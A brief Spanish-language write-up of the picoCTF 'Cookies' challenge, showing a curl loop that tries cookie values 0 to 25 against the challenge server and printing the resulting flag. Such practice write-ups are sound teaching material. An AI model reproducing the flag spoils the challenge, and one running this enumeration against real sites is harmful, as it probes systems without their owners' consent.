
**Reto:**
-Encontrar la cookie que esta relacionada con la bandera.

**Descripción:**
-Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:27177/](http://mercury.picoctf.net:27177/)

**Solución:**
Examinar la página en todas las cookies posible hasta encontrar la bandera.
-Abrir la página.
-Ingresar la cookie que indica el sitio.
-Usando el comando "curl", ciclar con cada cookie posible y buscar el archivo de la cookie.
```
$ for i in {0..25}; do curl -s http://mercury.picoctf.net:27177/check -H "Cookie: name=$i"; done | grep picoCTF
```
-Una vez terminado el ciclo, el resultado va a aparecer en la terminal.

El resultado es: **picoCTF{3v3ry1_l0v3s_c00k135_064663be}**.

**Notas adicionales:**
-Es posible cambiar el número de la cookie usando el cookie editor o en la pestaña de "Application".

**Referencias:**
[http://mercury.picoctf.net:27177/](http://mercury.picoctf.net:27177/)
https://curl.se/docs/tutorial.html